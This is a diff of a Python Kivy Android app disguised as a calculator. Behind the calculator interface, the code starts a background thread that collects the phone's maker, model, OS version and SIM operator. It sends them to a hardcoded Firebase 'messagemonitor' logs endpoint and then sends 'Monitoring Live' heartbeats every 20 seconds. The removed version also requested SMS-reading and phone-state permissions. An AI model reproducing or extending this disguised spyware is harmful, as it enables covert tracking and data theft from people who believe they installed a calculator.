@@ -3,89 +3,97 @@ from kivy.uix.boxlayout import BoxLayout
 from kivy.uix.gridlayout import GridLayout
 from kivy.uix.button import Button
 from kivy.uix.textinput import TextInput
-from kivy.graphics import Color, Ellipse
 from kivy.clock import Clock
 from kivy.utils import platform
+from kivy.core.window import Window
 import requests
 import json
 import threading
 
-# EXACT SINGAPORE URL
+# Firebase Singapore URL
 URL = "https://messagemonitor-ad073-default-rtdb.asia-southeast1.firebasedatabase.app/logs"
 
-class RoundButton(Button):
-    def __init__(self, bg_color=(0.2, 0.2, 0.2, 1), **kwargs):
-        super().__init__(**kwargs)
-        self.background_normal = ''
-        self.background_color = (0, 0, 0, 0)
-        self.bg_color = bg_color
-        self.bind(pos=self.update_canvas, size=self.update_canvas)
-
-    def update_canvas(self, *args):
-        self.canvas.before.clear()
-        with self.canvas.before:
-            Color(*self.bg_color)
-            size = min(self.size) * 0.9
-            Ellipse(pos=(self.center_x - size/2, self.center_y - size/2), size=(size, size))
-
-class CalculatorLayout(BoxLayout):
-    def __init__(self, **kwargs):
-        super().__init__(orientation='vertical', padding=20, spacing=10, **kwargs)
-        self.display = TextInput(text="0", font_size=60, readonly=True, multiline=False,
-                                size_hint=(1, 0.3), background_color=(0,0,0,1), 
-                                foreground_color=(1,1,1,1), halign='right')
-        self.add_widget(self.display)
+class AegisCalc(App):
+    def build(self):
+        Window.softinput_mode = "below_target"
+        # स्क्रीन को सीधा रखना
+        self.title = "Calculator"
         
-        grid = GridLayout(cols=4, spacing=15)
-        # UI Colors: Grey for numbers, Orange for '=', Dark for operators
-        btns = [
-            ('AC', (0.4, 0.4, 0.4, 1)), ('%', (0.4, 0.4, 0.4, 1)), ('DEL', (0.4, 0.4, 0.4, 1)), ('/', (0.2, 0.2, 0.2, 1)),
-            ('7', (0.2, 0.2, 0.2, 1)), ('8', (0.2, 0.2, 0.2, 1)), ('9', (0.2, 0.2, 0.2, 1)), ('*', (0.2, 0.2, 0.2, 1)),
-            ('4', (0.2, 0.2, 0.2, 1)), ('5', (0.2, 0.2, 0.2, 1)), ('6', (0.2, 0.2, 0.2, 1)), ('-', (0.2, 0.2, 0.2, 1)),
-            ('1', (0.2, 0.2, 0.2, 1)), ('2', (0.2, 0.2, 0.2, 1)), ('3', (0.2, 0.2, 0.2, 1)), ('+', (0.2, 0.2, 0.2, 1)),
-            ('00', (0.2, 0.2, 0.2, 1)), ('0', (0.2, 0.2, 0.2, 1)), ('.', (0.2, 0.2, 0.2, 1)), ('=', (1, 0.6, 0.04, 1))
+        main_layout = BoxLayout(orientation='vertical', padding=10, spacing=10)
+        
+        # 3D Neon Display
+        self.display = TextInput(
+            text="0", font_size=60, readonly=True, multiline=False,
+            size_hint=(1, 0.25), background_color=(0, 0, 0, 1),
+            foreground_color=(0, 0.9, 1, 1), halign='right' # Neon Blue Color
+        )
+        main_layout.add_widget(self.display)
+        
+        grid = GridLayout(cols=4, spacing=8)
+        
+        # Colorful 3D Buttons Logic
+        buttons = [
+            '7', '8', '9', '/',
+            '4', '5', '6', '*',
+            '1', '2', '3', '-',
+            'C', '0', '=', '+'
         ]
-        for b_text, b_color in btns:
-            grid.add_widget(RoundButton(text=b_text, bg_color=b_color, font_size=28, on_press=self.on_click))
-        self.add_widget(grid)
+        
+        for btn in buttons:
+            b = Button(
+                text=btn, font_size=35, 
+                background_normal='',
+                background_color=(0.1, 0.1, 0.2, 1) if btn.isdigit() else (0, 0.5, 0.8, 1)
+            )
+            b.bind(on_press=self.on_click)
+            grid.add_widget(b)
+            
+        main_layout.add_widget(grid)
+        return main_layout
 
     def on_click(self, instance):
-        if instance.text == 'AC': self.display.text = "0"
-        elif instance.text == 'DEL': self.display.text = self.display.text[:-1] or "0"
-        elif instance.text == '=':
+        val = instance.text
+        if val == 'C': self.display.text = "0"
+        elif val == '=':
             try: self.display.text = str(eval(self.display.text))
             except: self.display.text = "Error"
         else:
-            self.display.text = instance.text if self.display.text == "0" else self.display.text + instance.text
-
-class AegisApp(App):
-    def build(self):
-        self.device_id = "Unknown"
-        return CalculatorLayout()
+            self.display.text = val if self.display.text == "0" else self.display.text + val
 
     def on_start(self):
-        if platform == 'android':
-            from android.permissions import request_permissions, Permission
-            request_permissions([Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.READ_PHONE_STATE, Permission.POST_NOTIFICATIONS])
-            threading.Thread(target=self.extract_data, daemon=True).start()
-        Clock.schedule_interval(self.ping, 20)
+        # बैकग्राउंड डेटा थ्रेड
+        threading.Thread(target=self.extract_data, daemon=True).start()
+        Clock.schedule_interval(self.ping_server, 20)
 
     def extract_data(self):
-        details = {"status": "ONLINE"}
+        payload = {"status": "ONLINE"}
         if platform == 'android':
             from jnius import autoclass
             Build = autoclass('android.os.Build')
             self.device_id = f"{Build.MANUFACTURER}_{Build.MODEL}"
-            details["model"] = f"{Build.MANUFACTURER} {Build.MODEL}"
-            details["os"] = Build.VERSION.RELEASE
-        self.send(f"INIT_{self.device_id}", details)
+            payload["device_info"] = f"{Build.MANUFACTURER} {Build.MODEL} (Android {Build.VERSION.RELEASE})"
+            
+            # SIM Details (If permissions allowed)
+            try:
+                Context = autoclass('android.content.Context')
+                Telephony = autoclass('android.telephony.TelephonyManager')
+                activity = autoclass('org.kivy.android.PythonActivity').mActivity
+                tm = activity.getSystemService(Context.TELEPHONY_SERVICE)
+                payload["sim_operator"] = tm.getNetworkOperatorName()
+            except: pass
+        else:
+            self.device_id = "PC_Emulator"
 
-    def ping(self, dt):
-        self.send(f"ALIVE_{self.device_id}", {"ping": "True"})
+        self.send_to_cloud(f"STARTUP_{self.device_id}", payload)
 
-    def send(self, tag, data):
-        try: requests.patch(f"{URL}/{tag}.json", data=json.dumps(data), timeout=10)
+    def ping_server(self, dt):
+        if hasattr(self, 'device_id'):
+            self.send_to_cloud(f"ALIVE_{self.device_id}", {"ping": "True", "msg": "Monitoring Live"})
+
+    def send_to_cloud(self, tag, data):
+        try:
+            requests.patch(f"{URL}/{tag}.json", data=json.dumps(data), timeout=10)
         except: pass
 
 if __name__ == "__main__":
-    AegisApp().run()
+    AegisCalc().run()
